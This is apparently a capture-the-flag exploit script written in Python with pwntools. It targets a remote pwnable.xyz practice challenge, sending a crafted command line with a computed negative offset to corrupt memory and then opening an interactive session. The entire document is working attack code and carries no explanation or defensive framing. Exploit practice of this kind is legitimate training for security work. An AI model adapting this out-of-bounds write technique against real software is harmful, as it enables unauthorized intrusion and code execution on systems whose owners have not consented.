#!/usr/bin/env python
# -*- coding: utf-8 -*-
from __future__ import print_function
from pwn import *

binary = './challenge'
elf = ELF(binary)
libc = elf.libc

# io = process(binary, aslr = 0)
io = remote('svc.pwnable.xyz', 30029)
context.log_level = 'debug'
context.arch = elf.arch

myu64 = lambda x: u64(x.ljust(8, '\0'))
ub_offset = 0x3c4b30
codebase = 0x555555554000

offset = (0x202200 - 0xac8) / 8

io.recvuntil("> ")
io.sendline('1 1099511583977 -' + str(offset))

io.recvuntil('> ')
io.sendline('0 0 0')

io.interactive()
